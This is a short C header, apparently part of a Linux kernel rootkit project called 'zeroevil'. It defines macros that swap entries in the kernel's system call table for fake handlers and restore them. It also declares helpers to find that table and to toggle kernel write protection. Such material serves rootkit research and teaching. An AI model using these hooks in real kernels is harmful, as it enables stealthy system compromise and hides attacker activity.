#ifndef __ZEROEVIL_H
#define __ZEROEVIL_H


#define HOOK_SCT(sct, name) \
	do{						\
		real_##name = (void *) sct[__NR_##name];\
		sct[__NR_##name] = (void *)fake_##name; \
	}while(0)

#define UNHOOK_SCT(sct, name)	\
	sct[__NR_##name] = (void *)real_##name


unsigned long ** get_sct(void);
void disable_wp(void);
void enable_wp(void);


#endif
